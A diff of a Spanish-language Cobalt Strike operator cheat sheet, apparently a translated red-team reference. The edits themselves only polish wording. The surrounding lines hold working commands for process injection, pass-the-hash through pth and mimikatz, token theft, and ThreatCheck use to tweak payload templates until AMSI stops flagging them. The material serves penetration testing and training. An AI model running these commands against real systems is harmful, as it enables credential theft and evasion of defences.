@@ -79,20 +79,20 @@ rev2self # Deja de usar el token de steal_token
 
 ## Lanzar proceso con nuevas credenciales
 spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
-## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
+## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
 
 ## Inyectar en proceso
 inject [pid] [x64|x86] [listener]
 ## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente sea necesario (por ejemplo, x86 -> x64 o x64 -> x86).
 
 ## Pass the hash
-## Este proceso de modificación requiere parches en la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
+## Este proceso de modificación requiere parchar la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash a través de mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá la shell (si estás ejecutando como SYSTEM, estás bien)
+## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien)
 steal_token &#x3C;pid> #Robar token del proceso creado por mimikatz
 
 ## Pass the ticket
@@ -188,13 +188,13 @@ Después de modificar el código, solo ejecuta `./build.sh` desde el mismo direc
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
-No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que se cargaron.
+No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que están cargados.
 
 ### Kit de Recursos
 
 La carpeta ResourceKit contiene las plantillas para las cargas útiles basadas en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.
 
-Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas puedes encontrar qué es lo que no le gusta al defensor (AMSI en este caso) y modificarlo:
+Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar lo que el defensor (AMSI en este caso) no acepta y modificarlo:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
